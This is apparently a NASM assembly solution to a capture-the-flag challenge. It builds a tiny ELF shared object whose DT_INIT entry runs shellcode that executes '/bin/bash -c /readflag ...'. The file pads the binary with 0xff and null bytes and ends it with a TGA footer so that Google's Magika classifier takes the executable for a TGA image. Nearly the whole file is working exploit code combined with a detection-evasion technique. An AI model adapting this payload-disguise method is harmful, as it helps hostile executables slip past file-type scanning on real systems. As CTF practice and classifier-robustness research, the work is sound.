; the assembly is modified from these amazing writeups for PlaidCTF 2020 - golf.so:
; https://ctftime.org/writeup/20276
; https://blingblingxuanxuan.github.io/2024/01/29/240129-the-smallest-elf/

BITS 64
  org 0x0

ehdr:                           ; Elf64_Ehdr
  db 0x7f, "ELF", 2, 1, 1, 0    ; e_ident
  times 8 db 0
  dw  3                         ; e_type : ET_DYN
  dw  0x3e                      ; e_machine : EM_X86_64
  dd  1                         ; e_version : EV_CURRENT
  dq  _start                    ; e_entry
  dq  phdr_loadable - $$        ; e_phoff
  times 12 db 0xff              ; dq e_shoff + dd e_flags -> 12 bytes
  dw  phdr_loadable - $$        ; e_ehsize
  dw  0x38                      ; e_phentsize
  dw  2                         ; e_phnum
  ; e_shentsize + e_shnum + e_shstrnd, doesn't matter here
  ; put beg_content and mid_content here
  ; default block size is 4096
  ; beg_content: https://github.com/google/magika/blob/7cdd489e17d21c8e3b164a2c8e359ecd81971375/python/magika/magika.py#L304
  ; mid_content: https://github.com/google/magika/blob/7cdd489e17d21c8e3b164a2c8e359ecd81971375/python/magika/magika.py#L315-L325
  ; with some observations, I noticed that 0x00 and 0xff is quite common in TGA file
  ; after some trial and error, I found that using 0xff have the best result
  ; so we put as many as we can here to make the ELF looks like a TGA file
  times 8192 db 0xff

phdr_loadable:                  ; Elf64_Phdr
  dd  1                         ; p_type
  dd  7                         ; p_flags
  dq  0                         ; p_offset
  dq  $$                        ; p_vaddr
  times 8 db 0                  ; dq p_paddr -> 8 bytes
  dq  loadable_size             ; p_filesz
  dq  loadable_size             ; p_memsz
  times 8 db 0                  ; dq p_align -> 8 bytes

phdr_dynamic:                   ; Elf64_Phdr
  dd  2                         ; p_type
  dd  7                         ; p_flags
  dq  loadable_size             ; p_offset
  dq  _dynamic                  ; p_vaddr
  ; p_paddr + p_filesz + p_memsz + p_align, doesn't matter here
  ; we put our exploit here to avoid the shellcode affecting the result of magika
_start:
  ; generated by pwntools :p
  ; execve(path='/bin/bash', argv=['/bin/bash', '-c', '/readflag give me the flag > out.png'], envp=0)
  ; push b'/bin/bash\x00'
  push 0x68
  mov rax, 0x7361622f6e69622f
  push rax
  mov rdi, rsp
  ; push argument array ['/bin/bash\x00', '-c\x00', '/readflag give me the flag > out.png\x00']
  ; push b'/bin/bash\x00-c\x00/readflag give me the flag > out.png\x00'
  push 0x67
  mov rax, 0x6e702e74756f203e
  push rax
  mov rax, 0x2067616c66206568
  push rax
  mov rax, 0x7420656d20657669
  push rax
  mov rax, 0x672067616c666461
  push rax
  mov rax, 0x101010101010101
  push rax
  mov rax, 0x101010101010101 ^ 0x65722f00632d0068
  xor [rsp], rax
  mov rax, 0x7361622f6e69622f
  push rax
  xor esi, esi ; 0
  push rsi ; null terminate
  push 0x15
  pop rsi
  add rsi, rsp
  push rsi ; '/readflag give me the flag > out.png\x00'
  push 0x1a
  pop rsi
  add rsi, rsp
  push rsi ; '-c\x00'
  push 0x18
  pop rsi
  add rsi, rsp
  push rsi ; '/bin/bash\x00'
  mov rsi, rsp
  xor edx, edx ; 0
  ; call execve()
  push 0x3b ; SYS_execve
  pop rax
  syscall
loadable_size  equ  $ - ehdr

_dynamic:
  dq 0Ch, _start           ;DT_INIT
  dq 6, 0                  ;DT_SYMTAB

dynamic_size equ $ - _dynamic

; put end_content here
; we can use a lot of null bytes and ends with TGA file footer to make the ELF looks like a TGA file
; https://www.dca.fee.unicamp.br/~martino/disciplinas/ea978/tgaffs.pdf
; https://en.wikipedia.org/wiki/Truevision_TGA#File_footer_(optional)
; https://github.com/google/magika/blob/7cdd489e17d21c8e3b164a2c8e359ecd81971375/python/magika/magika.py#L306-L308
times 4096 db 0
db `TRUEVISION-XFILE.\0`
